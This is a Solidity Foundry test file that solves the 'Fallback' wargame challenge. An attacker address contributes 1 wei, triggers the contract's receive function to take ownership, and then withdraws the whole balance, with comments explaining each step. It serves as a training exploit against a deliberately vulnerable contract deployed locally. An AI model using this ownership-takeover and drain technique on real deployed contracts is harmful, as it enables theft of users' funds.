// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Test {
    Fallback public fallbackInstance;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // uint256   sepoliaFork = vm.createSelectFork("sepolia");
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.startPrank(deployer);
        fallbackInstance = new Fallback();
        console.log("Owner:", fallbackInstance.owner());
        vm.stopPrank();
    }
    // forge test --mt testFallbackLocal -vvvv
    // forge test --mt testFallbackLocal --fork-url $SEPOLIA_RPC_URL

    function testFallbackLocal() public {
        // ---- Attack Starts From here ---

        // - As you can see in the contract, we need to be the owner of the contract, to crack it.
        // - the contract has a `receive` function, so we can't send ETH to it.
        // - To be the new owner, the `receive` function checks the sender, sends ETH, and he is one of the contributors.
        // - We will fire `contribute` function, and send 1 wei, so we will be one of the contributors.
        // - Then we will send ETH to the `Fallback` contract (1 wei), since we are one of the contributors, we will path the check, and we will be the owner of the contract.
        // - We passed the first requirement and became the owners of the contract.
        // - We can simply call `withdraw` and take all `Fallback` ETH since we are the new owners.

        vm.startPrank(attacker);
        fallbackInstance.contribute{value: 1 wei}(); //send ether when interacting with an ABI
        (bool success,) = address(fallbackInstance).call{value: 1 wei}(""); //send ether outside of the ABI
        require(success, "Revert sending 1 wei to `fallbackInstance`");
        console.log("New Owner:", fallbackInstance.owner()); // We became the owners

        fallbackInstance.withdraw();
        vm.stopPrank();
        assertEq(address(fallbackInstance).balance, 0, "Fallback contract should have 0 balance after withdrawal");
        assertEq(fallbackInstance.owner(), attacker, "Attacker should be the new owner of the Fallback contract");
    }
}
